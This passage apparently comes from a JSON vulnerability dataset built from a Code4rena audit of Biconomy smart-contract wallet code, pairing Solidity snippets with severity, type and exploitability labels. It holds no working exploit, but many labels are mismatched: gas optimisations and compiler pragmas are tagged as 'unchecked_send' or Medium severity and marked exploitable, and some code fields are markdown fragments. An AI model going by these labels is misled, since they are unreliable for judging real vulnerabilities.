    "code": "solidity\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Vulnerability and recommended fix",
    "description": "The SmartAccount inherits from ReentrancyGuardUpgradeable contract SmartAccount is Singleton, BaseSmartAccount, IERC165,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.774,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction handlePayment(\n\tuint256 gasUsed,\n\tuint256 baseGas,\n\tuint256 gasPrice,\n\tuint256 tokenGasPriceFactor,\n\taddress gasToken,\n\taddress payable refundReceiver\n) private nonReentrant returns (uint256 payment) {\n\t// uint256 startGas = gasleft();\n\t// solhint-disable-next-line avoid-tx-origin\n\taddress payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n\tif (gasToken == address(0)) {\n\t\t// For ETH we will only adjust the gas price to not be higher than the actual used gas price\n\t\tpayment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n\t\t(bool success,) = receiver.call{value: payment}(\"\");\n\t\trequire(success, \"BSA011\");\n\t} else {\n\t\tpayment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n\t\trequire(transferToken(gasToken, receiver, payment), \"BSA012\");\n\t}\n\t// uint256 requiredGas = startGas - gasleft();\n\t//console.log(\"hp %s\", requiredGas);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Vulnerability and recommended fix",
    "description": "When handling the gas refund payment in ERC20, the transaction suffer from division by zero error if the tokenGasPriceFactor is set to 0 if (refundInfo.gasPrice > 0) { //console.log(\"sent %s\", startGas - gasleft()); // extraGas = gasleft(); payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.928,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L36 => return (a & b) + (a ^ b) / 2;\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings",
    "description": "https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L36 => return (a & b) + (a ^ b) / 2; https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.343,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n    modifier mixedAuth {\n        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n        _;\n   }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-01] Wrong visibility in SmartAccount contract",
    "description": "SmartAccount contract implements `mixedAuth` modifier to validate the caller is the `owner` OR the contract itself. The functions implementing this modifier have `external` visibility which the contract itself can't call due to visibility. Recommend changing the `external` visibility to `public` visibility. Modifier; modifier mixedAuth { require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\"); _;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.14,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "deployCounterFactualWallet",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-02] SmartAccountFactory's frontrunnable functions",
    "description": "SmartAccountFactory has `deployCounterFactualWallet` and `deployWallet` functions to deploy SCW using create2/create and pointing it to `_defaultImpl` address. However, these functions are prone to be frontrunned by an actor.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n    function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n        bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n        bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)\n        }\n        require(address(proxy) != address(0), \"Create2 call failed\");\n        // EOA + Version tracking\n        emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);\n        BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n        isAccountExist[proxy] = true;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "`deployCounterFactualWallet` function below; function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){ bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index)))); bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl))); // solhint-disable-next-line no-inline-assembly",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.815,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "require(signatures.length == 65)",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-03] Missing sig.length check",
    "description": "SignatureDecorder contract's `signatureSplit` function does not check the signature length as `require(signatures.length == 65)`.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.032,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: base/ModuleManager.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L124\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "[Gas-04] Arithmatic Operation could be ```uncheck``` which will never goes ```Underflow```/```Overflow```",
    "description": "*Instances(1)* File: base/ModuleManager.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L124",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.169,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L334",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "1) Early revert in `_payPrefund` saves some gas",
    "description": "https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L108 the `_payPrefund` function is called within `validateUserOp` which is called by `entryPoint` within `_validateAccountPrepayment`. If the call within `_payPrefund` reverts/fails, it will revert in line 334: `https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L334` Reverting earlier will therefore save some gas. *As with all logic changes, this implementation needs careful validation to not collide with any other logic. 2) Removal of unnecessary `assert` will save some gas",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.135,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "pragma solidity 0.8.12",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "# Outdated Compiler",
    "description": "The pragma version used for the contracts `pragma solidity 0.8.12` It is recommended to use the minimum required version of 0.8.17 or contracts may get affected by bugs that have been fixed upto this version, these are as follows :",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nThe above operation cannot underflow due to the check :\n\n[require(amount <= currentBalance, \"Insufficient amount to withdraw\");](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L57) \n\nIt should be marked as ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "1- Use `unchecked` blocks to save gas :",
    "description": "Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn\u2019t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block. There are 2 instances of this issue : File: StakeManager.sol [Line 118](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L118) info.deposit = uint112(info.deposit - withdrawAmount); The above operation cannot underflow due to the check :",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.327,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nBecause the check [line 171](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L171) ensures that we always have ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "2- Redundant check in `init` function should be removed :",
    "description": "In the `init` function from the `SmartAccount` the following check is redundant : File: SmartAccount.sol [Line 174](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L174) if (_handler != address(0)) internalSetFallbackHandler(_handler); Because the check [line 171](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L171) ensures that we always have `_handler != address(0)` and so the `internalSetFallbackHandler` should be called immediatly and the if check should be removed to save gas.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.185,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nFile: VerifyingSingletonPaymaster.sol [Line 128](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L128)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "3- `x += y/x -= y` costs more gas than `x = x + y/x = x - y` for state variables :",
    "description": "Using the addition operator instead of plus-equals saves **113 gas** as explained [here](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8) There are 3 instances of this issue: File: VerifyingSingletonPaymaster.sol [Line 51](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L51) paymasterIdBalances[paymasterId] += msg.value; File: VerifyingSingletonPaymaster.sol [Line 58](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L58)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.223,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: SmartAccount.sol\n\n77      require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n110     require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n128     require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n\nFile: SmartAccountFactory.sol\n\n18      require(_baseImpl != address(0), \"base wallet address can not be zero\");\n\nFile: SmartAccountNoAuth.sol\n\n77      require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n110     require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n128     require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n440     require(dest != address(0), \"this action will burn your funds\");\n\nFile: VerifyingSingletonPaymaster.sol\n\n36      require(address(_entryPoint) != address(0), \"VerifyingPaymaster: Entrypoint can not be zero address\");\n37      require(_verifyingSigner != address(0), \"VerifyingPaymaster: signer of paymaster can not be zero address\");\n49      require(!Address.isContract(paymasterId), \"Paymaster Id can not be smart contract address\");\n50      require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\n66      require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n107     require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\n108     require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");\n109     require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "4- `require()` strings longer than 32 bytes cost extra gas :",
    "description": "Each extra memory word of bytes past the original 32 incurs an MSTORE which costs 3 gas. There are 16 instances of this issue : File: SmartAccount.sol 77      require(msg.sender == owner, \"Smart Account:: Sender is not authorized\"); 110     require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: base/ModuleManager.sol\n\n34      require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n49      require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n68      require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "5- Splitting `require()` statements that uses && saves gas :",
    "description": "There are 3 instances of this issue : File: base/ModuleManager.sol 34      require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 49      require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 68      require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.285,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: SmartAccount.sol\n\n155      function getNonce(uint256 batchId) public\n166      function init(address _owner, address _entryPointAddress, address _handler) public  \n389      function execTransaction(Transaction memory _tx, uint256 batchId, FeeRefund memory refundInfo, bytes memory signatures) public\n518      function getDeposit() public \n525      function addDeposit() public \n536      function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public \n\nFile:  SmartAccountFactory.sol\n\n33      function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public \n53      function deployWallet(address _owner, address _entryPoint, address _handler) public  \n\nFile: base/FallbackManager.sol\n\n26      function setFallbackHandler(address handler) public \n\nFile: base/ModuleManager.sol\n\n32      function enableModule(address module) public \n47      function disableModule(address prevModule, address module) public \n80      function execTransactionFromModuleReturnData(address to, uint256 value, bytes memory data, Enum.Operation operation) public\n105     function isModuleEnabled(address module) public view returns (bool) \n\nFile: libs/MultiSend.sol\n\n26      function multiSend(bytes memory transactions) public \n\nFile: libs/MultiSendCallOnly.sol\n\n21      function multiSend(bytes memory transactions) public \n\nFile: paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n48      function depositFor(address paymasterId) public \n55      function withdrawTo(address payable withdrawAddress, uint256 amount) public\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "6- `public` functions not called by the contract should be declared `external` instead :",
    "description": "The `public` functions that are not called inside the contract should be declared `external` instead to save gas. There are 17 instances of this issue: File: SmartAccount.sol 155      function getNonce(uint256 batchId) public 166      function init(address _owner, address _entryPointAddress, address _handler) public",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 39,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: EntryPoint.sol\n\n100     for (uint256 i = 0; i < opasLen; i++)\n107     for (uint256 a = 0; a < opasLen; a++) \n112     for (uint256 i = 0; i < opslen; i++)\n128     for (uint256 a = 0; a < opasLen; a++) \n134     for (uint256 i = 0; i < opslen; i++)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "7- `++i/i++` should be `unchecked{++i}/unchecked{i++}` when it is not possible for them to overflow, as in the case when used in for & while loops :",
    "description": "There are 5 instances of this issue: File: EntryPoint.sol 100     for (uint256 i = 0; i < opasLen; i++) 107     for (uint256 a = 0; a < opasLen; a++) 112     for (uint256 i = 0; i < opslen; i++)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.253,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " library to perform the same arithmetic operations. This is generally considered to be a better practice, because it is easier to read and understand. It also automatically handles overflows and underflows, which can help to protect against  any potential bugs or vulnerabilities.\n\nIt's a good idea to use functions from the ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "# Use SafeMath or Math library to do the arithmetic operation",
    "description": "Consider a example below, // calculating using  operators max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500 // calculating using SafeMath max((_tx.targetTxGas.mul(64).div(63), _tx.targetTxGas.add(2500)).add(500)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.325,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n100: for (uint256 i = 0; i < opasLen; i++)\n107: for (uint256 a = 0; a < opasLen; a++)\n112: for (uint256 i = 0; i < opslen; i++)\n128: for (uint256 a = 0; a < opasLen; a++)\n134: for (uint256 i = 0; i < opslen; i++)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "G-01 ++I or I++ SHOULD BE UNCHECKED{++I} or UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS",
    "description": "*Number of Instances Identified: 5* The\u00a0`unchecked`\u00a0keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves\u00a0**30-40 gas\u00a0[per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**. https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 100: for (uint256 i = 0; i < opasLen; i++) 107: for (uint256 a = 0; a < opasLen; a++)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.214,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n34: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n49: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n68: require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "G-02 SPLITTING REQUIRE() STATEMENTS THAT USE && SAVES GAS",
    "description": "*Number of Instances Identified: 3* See\u00a0[this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128)\u00a0which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by\u00a0**3 gas** https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol 34: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 49: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.243,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BasePaymaster.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::6 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol::6 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol::2 => pragma solidity ^0.8.12;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol::2 => pragma solidity ^0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol::2 => pragma solidity ^0.8.12; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BasePaymaster.sol::2 => pragma solidity ^0.8.12; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::6 => pragma solidity ^0.8.12; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol::2 => pragma solidity ^0.8.12; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::2 => pragma solidity ^0.8.12;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/SecuredTokenTransfer.sol#L16) \n- [",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Instances",
    "description": "- [```// review virtual```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L59) - [```// Review if we need to make view function```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L86) - [```// review? if rename wallet to account is must```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L44) - [```// review IEntryPoint private _entryPoint;```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L58) - [```//@review getNonce specific to EntryPoint requirements```](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L149)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.146,
